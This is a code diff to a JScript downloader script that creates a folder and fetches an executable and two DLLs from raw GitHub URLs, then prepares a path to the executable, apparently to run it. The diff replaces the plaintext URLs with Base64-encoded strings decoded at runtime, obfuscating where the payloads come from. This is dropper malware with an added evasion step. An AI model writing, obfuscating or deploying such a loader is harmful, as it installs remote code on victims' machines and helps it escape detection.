@@ -11,14 +11,18 @@
                 fso.CreateFolder(targetDir);
             }
             
-            // URLs...
-            var urls = [
-                "https://github.com/amindaraji64-arch/a/raw/refs/heads/main/runtimefixer.exe",
-                "https://github.com/amindaraji64-arch/b/raw/refs/heads/main/DismCore.dll",
-                "https://github.com/amindaraji64-arch/c/raw/refs/heads/main/PagePdfSize_Config.dll"
+            // URLs in Base64
+            var urlsBase64 = [
+                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9ydW50aW1lZml4ZXIuZXhl",
+                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2IvcmF3L3JlZnMvaGVhZHMvbWFpbi9EaXNtQ29yZS5kbGw=",
+                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2MvcmF3L3JlZnMvaGVhZHMvbWFpbi9QYWdlUGRmU2l6ZV9Db25maWcuZGxs"
             ];
             
             var filenames = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
+            
+            function decodeBase64(base64) {
+                return atob(base64);
+            }
             
             function downloadFile(url, filePath) {
                 try {
@@ -41,9 +45,10 @@
                 return false;
             }
             
-            for (var i = 0; i < urls.length; i++) {
+            for (var i = 0; i < urlsBase64.length; i++) {
+                var url = decodeBase64(urlsBase64[i]);
                 var filePath = targetDir + '\\' + filenames[i];
-                downloadFile(urls[i], filePath);
+                downloadFile(url, filePath);
             }
             
             var exePath = targetDir + '\\runtimefixer.exe';
